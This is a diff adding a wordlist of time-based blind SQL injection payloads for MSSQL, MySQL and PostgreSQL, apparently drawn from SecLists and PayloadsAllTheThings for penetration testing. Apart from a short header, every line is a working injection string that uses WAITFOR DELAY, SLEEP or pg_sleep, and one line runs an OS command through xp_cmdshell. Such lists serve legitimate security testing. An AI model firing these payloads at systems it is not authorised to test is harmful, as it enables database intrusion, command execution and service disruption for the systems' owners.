@@ -1,0 +1,34 @@
+# SQLi Time-Based Payloads
+# Sources: SecLists, PayloadsAllTheThings
+# Purpose: Detect blind SQLi by inducing a measurable time delay in the server response.
+# WARNING: These payloads cause the target database to pause. Use responsibly.
+'; WAITFOR DELAY '0:0:5'--
+'; WAITFOR DELAY '0:0:5'/*
+1; WAITFOR DELAY '0:0:5'--
+1 WAITFOR DELAY '0:0:5'--
+'; WAITFOR DELAY '0:0:5'; --
+' OR SLEEP(5)--
+' OR SLEEP(5)#
+' OR SLEEP(5)/*
+1 OR SLEEP(5)
+1; SELECT SLEEP(5)--
+'; SELECT SLEEP(5)--
+'; SELECT SLEEP(5)#
+1' OR SLEEP(5)--
+1' AND SLEEP(5)--
+' AND SLEEP(5)--
+' AND SLEEP(5)#
+1 AND SLEEP(5)
+" OR SLEEP(5)--
+" AND SLEEP(5)--
+'; SELECT pg_sleep(5)--
+'; SELECT pg_sleep(5)#
+1; SELECT pg_sleep(5)--
+' OR pg_sleep(5)--
+1 OR pg_sleep(5)--
+' AND pg_sleep(5)--
+1 AND pg_sleep(5)--
+'; EXEC master..xp_cmdshell 'ping -n 5 127.0.0.1'--
+' AND 1=(SELECT 1 FROM (SELECT SLEEP(5))a)--
+' OR 1=(SELECT 1 FROM (SELECT SLEEP(5))a)--
+1 AND (SELECT * FROM (SELECT(SLEEP(5)))a)--
